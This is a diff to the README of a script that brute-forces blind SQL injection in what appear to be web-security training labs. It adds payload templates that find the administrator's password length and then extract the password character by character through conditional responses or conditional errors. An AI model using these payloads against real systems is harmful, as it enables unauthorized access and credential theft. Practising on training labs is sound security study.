@@ -2,11 +2,17 @@
 The script gets the password length and execute a bruteforce attack to the web.
 - Lab: Blind SQL injection with conditional responses
 ```sql
-'and (select substring(password, %d, 1) from users where username = 'administrator') = '%s
+'and (select 'a' from users where username = 'administrator' and length(password) > {counter}) = 'a
+```
+```sql
+'and (select substring(password, {position}, 1) from users where username = 'administrator') = '{character}
 ```
 - Lab: Blind SQL injection with conditional errors
 ```sql
-'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN '1' = '1' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > {counter})||'
+```
+```sql
+'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
 ## Requirements
@@ -17,5 +23,3 @@ All the requirements can be installed from requirements.txt file executing this 
 ```bash
 pip3 install -r requirements.txt
 ```
-## To-Do
-- Get pass length on coditional error attack
